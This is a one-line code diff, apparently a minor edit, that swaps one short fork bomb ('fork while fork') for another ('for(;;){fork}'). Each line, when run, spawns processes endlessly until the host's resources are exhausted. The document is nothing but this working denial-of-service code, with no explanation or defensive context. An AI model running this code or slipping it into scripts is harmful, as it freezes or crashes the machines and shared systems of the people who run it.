@@ -1,1 +1,1 @@
-fork while fork
+for(;;){fork}
